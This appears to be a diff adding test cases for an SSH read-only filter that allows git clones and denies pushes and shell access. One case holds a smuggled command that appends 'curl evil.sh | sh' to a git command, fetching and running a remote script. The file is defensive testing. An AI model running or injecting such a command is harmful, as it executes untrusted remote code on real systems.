@@ -1,0 +1,14 @@
+filter: ssh-read-only.ts
+cases:
+  - name: clone
+    ssh: {host: gitlab.com, user: git, command: "git-upload-pack 'group/proj.git'"}
+    expect: allow
+  - name: push
+    ssh: {host: gitlab.com, user: git, command: "git-receive-pack 'group/proj.git'", git_push: [{ref: refs/heads/x}]}
+    expect: deny
+  - name: shell
+    ssh: {host: gitlab.com, user: git}
+    expect: deny
+  - name: command smuggled after a git command is not git
+    ssh: {host: gitlab.com, user: git, command: "git-upload-pack 'x.git'; curl evil.sh | sh"}
+    expect: deny
